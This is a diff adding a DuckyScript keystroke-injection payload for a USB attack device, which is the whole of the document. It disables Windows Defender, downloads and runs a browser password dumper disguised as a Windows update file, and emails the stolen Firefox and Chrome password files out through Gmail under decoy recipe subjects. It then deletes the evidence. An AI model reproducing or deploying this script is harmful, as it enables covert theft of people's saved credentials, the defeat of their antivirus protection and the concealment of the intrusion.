@@ -1,0 +1,200 @@
+REM DOWNLOAD AND USE PASSWORD STEALER
+DELAY 1000
+GUI r
+DELAY 900 
+STRING powershell Start-Process powershell -Verb runAs
+DELAY 1000
+ENTER
+DELAY 900
+ALT y
+DELAY 900
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+DELAY 800
+ENTER
+DELAY 700
+STRING exit
+DELAY 200 
+ENTER
+GUI r 
+DELAY 1000
+STRING powershell
+ENTER
+DELAY 900
+REM Use your own hosting website. The payload we will be using is https://github.com/moonD4rk/HackBrowserData/releases/tag/v0.3.5
+STRING Invoke-WebRequest 'url' outFile 'Downloads\WindowsUpdateSucess.txt.exe'                                                                                                                                                                                  
+DELAY 300 
+ENTER
+DELAY 4900
+STRING cd .\Downloads\
+ENTER
+DELAY 1500 
+STRING start-process .\WindowsUpdateSucess.txt.exe 
+ENTER
+DELAY 500 
+STRING exit
+ENTER
+REM email with gmail
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+STRING $SMTPServer = 'smtp.gmail.com'
+ENTER
+DELAY 1000
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+DELAY 1000
+STRING $SMTPPort = '587'
+ENTER
+DELAY 1000
+STRING $Username = 'email"gmail.com'
+ENTER
+DELAY 1000
+STRING $Password = 'pass'
+ENTER
+DELAY 1000
+STRING $to = 'email"gmail.com'
+ENTER
+DELAY 1000
+STRING $subject = @The Recipe you wanted@
+ENTER
+DELAY 1000
+STRING $body = @One cup of brown rice@
+ENTER
+DELAY 1000
+STRING $attachment = 'Downloads\results\firefox_password.csv'
+ENTER
+DELAY 1000
+STRING $message = New-Object System.Net.Mail.MailMessage
+ENTER
+DELAY 1000
+STRING $message.subject = $subject
+ENTER
+DELAY 1000
+STRING $message.body = $body
+ENTER
+DELAY 1000
+STRING $message.to.add($to)
+ENTER
+DELAY 1000 
+STRING $message.from = $username
+ENTER
+DELAY 1000
+STRING $message.attachments.add($attachment)
+ENTER
+DELAY 1000
+STRING $smtp = New-Object System.Net.Mail.SmtpClient($SMTPServer, $SMTPPort);
+ENTER
+DELAY 1000
+STRING $smtp.EnableSSL = $true
+ENTER
+DELAY 1000
+STRING $smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password);
+ENTER
+DELAY 1000
+STRING $smtp.send($message)
+ENTER
+DELAY 1000
+STRING exit
+DELAY 600
+ENTER
+DELAY 1500
+REM CHROME EMAIL 
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+STRING $SMTPServer = 'smtp.gmail.com'
+ENTER
+DELAY 1000
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+DELAY 1000
+STRING $SMTPPort = '587'
+ENTER
+DELAY 1000
+STRING $Username = 'email"gmail.com'
+ENTER
+DELAY 1000
+STRING $Password = 'pass
+ENTER
+DELAY 1000
+STRING $to = 'email"gmail.com'
+ENTER
+DELAY 1000
+STRING $subject = @The Recipecccc wanted@
+ENTER
+DELAY 1000
+STRING $body = @One cup of brown rice@
+ENTER
+DELAY 1000
+STRING $attachment = 'Downloads\results\chrome_password.csv'
+ENTER
+DELAY 1000
+STRING $message = New-Object System.Net.Mail.MailMessage
+ENTER
+DELAY 1000
+STRING $message.subject = $subject
+ENTER
+DELAY 1000
+STRING $message.body = $body
+ENTER
+DELAY 1000
+STRING $message.to.add($to)
+ENTER
+DELAY 1000 
+STRING $message.from = $username
+ENTER
+DELAY 1000
+STRING $message.attachments.add($attachment)
+ENTER
+DELAY 1000
+STRING $smtp = New-Object System.Net.Mail.SmtpClient($SMTPServer, $SMTPPort);
+ENTER
+DELAY 1000
+STRING $smtp.EnableSSL = $true
+ENTER
+DELAY 1000
+STRING $smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password);
+ENTER
+DELAY 1000
+STRING $smtp.send($message)
+DELAY 700
+ENTER
+DELAY 800
+STRING EXIT
+DELAY 700 
+ENTER
+REM NOW WE NEED TO DELETE WHAT WE DOWNLOADED 
+GUI r 
+DELAY 1400 
+STRING powershell
+ENTER
+DELAY 1000
+STRING cd .\Downloads\
+DELAY 900
+ENTER
+STRING del .\results
+DELAY 600
+ENTER
+DELAY 2000 
+STRING Y
+DELAY 500
+ENTER
+DELAY 600
+STRING del .\WindowsUpdateSucess.txt.exe
+DELAY 800
+ENTER
+DELAY 700
+STRING Clear-Recyclebin
+DELAY 2500
+ENTER
+DELAY 900
+STRING Y
+DELAY 400
+ENTER
+DELAY 500
+STRING exit
+ENTER
